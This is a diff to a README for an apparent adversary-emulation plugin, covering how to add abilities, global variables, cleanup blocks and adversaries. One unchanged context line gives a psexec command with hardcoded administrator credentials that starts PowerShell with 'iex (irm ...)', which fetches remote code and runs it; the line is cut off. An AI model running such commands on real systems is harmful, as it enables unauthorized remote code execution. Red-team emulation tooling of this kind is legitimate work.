@@ -9,7 +9,7 @@ This plugin contains:
 You can quickly add your own abilities and adversaries, both of which are reloaded every time
 the core server reboots.
 
-### Adding new abilities
+## Adding new abilities
 
 Add a .yml file in the abilities directory, named after a unique ID (UUID-4 is our standard). 
 This file should include an ID, name, description, ATT&CK tactic and command.
@@ -23,6 +23,8 @@ Below is an example ability:
   command: |
     whoami
 ```
+
+### Variables
 
 As you write commands, note that there are two global variables available, server and group.
 
@@ -61,7 +63,13 @@ psexec \\127.0.0.1 -u administrator -p password123 Powershell.exe iex (irm -Meth
 Consult the 54ndc47 agent's delivery commands to see the various ways to deploy by specifying (or not specifying) 
 a group.
 
-### Adding new adversaries
+### Cleanup
+
+Abilities can include a cleanup block, which will execute automatically at the end of an operation. The
+cleanup should be used in instances you want to reverse a mutable action, such as stopping a started process. An
+example ability with cleanup is shown in the previous example.
+
+## Adding new adversaries
 
 New adversaries can be added to the adversaries.yml file.
 
